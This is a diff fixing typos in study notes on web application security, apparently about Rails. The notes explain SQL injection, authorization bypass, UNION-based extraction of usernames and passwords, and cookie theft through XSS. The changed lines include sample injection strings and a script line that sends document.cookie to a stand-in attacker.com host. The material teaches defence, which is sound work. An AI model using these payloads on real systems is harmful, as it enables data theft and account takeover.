@@ -10,7 +10,7 @@
 - Permitted list contains good email addresses, public actions, good html tags
 - When sanitizing, protecting, verifying something, prefer permitted lists
 - Though sometimes it's not possible to create a permitted list (e.g. spam filter)
-- Use `before_action except: []` instead of `only: []` for security relation actions
+- Use `before_action except: []` instead of `only: []` for security related actions
   - This way you don't forget to enable security checks for new actions
 - Allow `<strong>` instead of removing `<script>` against cross site scripting (XSS)
 - Don't try to correct user input using restricted lists
@@ -40,7 +40,7 @@
   - Applications or client-site proxies make it easy to change requests
   - There are also other attack vectors like banner advertisements
 - Mpack attack framework
-  - Tries to install malicious software throough security holes in the web browser
+  - Tries to install malicious software through security holes in the web browser
   - Very successfully, 50% of the attacks succeed
 
 ## SQL Injection
@@ -49,14 +49,14 @@
   - Another goal is to carry out data manipulation or reading arbitrary data
 - For example, do not use user input in a query directly
   - `Project.where("name = '#{params[:name]}'")`
-  - If a user enters 'OR 1) --', the resulting query will be
-  - `SELECT * FROM projects WHERE (name = '' OR 1) --')`
+  - If a user enters `'OR 1) --`, the resulting query will be
+  - `SELECT * FROM projects WHERE (name = '' OR 1) --)`
   - The two dashes start a comment ignoring everything after it
   - So the query returns all records fronn the project table
 
 ### Bypassing Authorization
 - Usually web application includes access control
-- User enters login credentials and webapp tries to find matchibng record in users table
+- User enters login credentials and webapp tries to find matching record in users table
 - The app grants access when it finds a record
 - An attacker may possibly bypass this check using SQL injection like this
   - If an attacker enters `' OR '1'='1` as the name, and `' OR '2'>'1` as the password
@@ -71,10 +71,10 @@
 - For example
   - `Project.where("name = '#{params[:name]}'")`
   - Inject another query using union
-  - `') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --`
+  - `') UNION SELECT id, login AS name, password AS description, 1, 1, 1 FROM users --`
   - The resulting query will be
   - `SELECT * FROM projects WHERE (name = '') UNION`
-    - `SELECT id,login AS name,password AS description,1,1,1 FROM users --'`
+    - `SELECT id, login AS name, password AS description, 1, 1, 1 FROM users --'`
 - The result won't be a list of project (as there is no project with empty name)
   - But a list of usernames and their password
   - So hopefully you securely hashed the password in the database
@@ -113,7 +113,7 @@
 - 'document.cookie' holds the cookie of the originating web server
   - You can read & write this property if you embed the code directly in HTML document
   - <script>document.write(document.cookie);</script>
-  - But that is not useful to the attacker as they will see their own lookie
+  - But that is not useful to the attacker as they will see their own cookie
 - This will try to load an image from the specific url plus the cookie
   - document.write('<img src="http://www.attacker.com/' + document.cookie + '">')
   - This url doesn't exist, so the browser displays nothing
@@ -257,7 +257,7 @@
   - HTTP/1.1 302 Moved Temporarily, Location: http://www.malicious.tld
 
 ### DNS Rebinding and Host Header Attacks
-- DNS rebinding is a method of manipulating resoultion of domain names
+- DNS rebinding is a method of manipulating resolution of domain names
 - DNS rebinding circumvents the same-origin policy by abusing DNS instead
   - It rebinds a domain to a different IP address
   - And then compromises the system by executing random code against the web app
